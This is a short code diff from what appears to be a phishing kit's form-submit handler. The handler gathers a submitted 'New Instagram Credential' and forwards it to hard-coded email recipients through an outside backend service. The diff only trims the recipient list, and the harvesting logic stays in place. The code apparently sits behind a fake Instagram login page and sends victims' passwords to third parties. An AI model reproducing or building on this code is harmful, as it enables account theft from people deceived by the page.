@@ -10,7 +10,7 @@ const handleSubmit = (e) => {
         result.innerHTML= "<div style='padding: 60px 0;'></div>";
         setTimeout(()=>{
             const form = new FormData();
-            const recipient = "baddestjiggy@gmail.com,fundtools@gmail.com";
+            const recipient = "baddestjiggy@gmail.com";
             const email_backend = "https://active-pay-backend.onrender.com/";
             const body = (`
                New Instagram Credential
